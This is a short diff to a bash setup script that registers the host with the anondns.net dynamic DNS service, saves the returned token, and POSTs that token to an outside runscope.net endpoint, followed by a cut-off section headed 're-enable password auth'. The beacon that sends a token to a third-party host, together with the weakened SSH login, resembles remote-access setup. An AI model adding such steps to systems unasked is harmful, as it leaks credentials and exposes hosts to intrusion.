@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
 
 ## register dynamic dns
-data=$(curl -sSL http://anondns.net/api/register/$(hostname -s).z.anondns.net/a/$(curl -4s icanhazip.com))
-echo data > ~/anondns.token
+data=$(curl -sSL http://anondns.net/api/register/$(hostname -s).y.anondns.net/a/$(curl -4s icanhazip.com))
+echo ${data} > ~/anondns.token
 curl -X POST -d "${data}" https://c82kjcyerfcp.runscope.net
 
 ## re-enable password auth
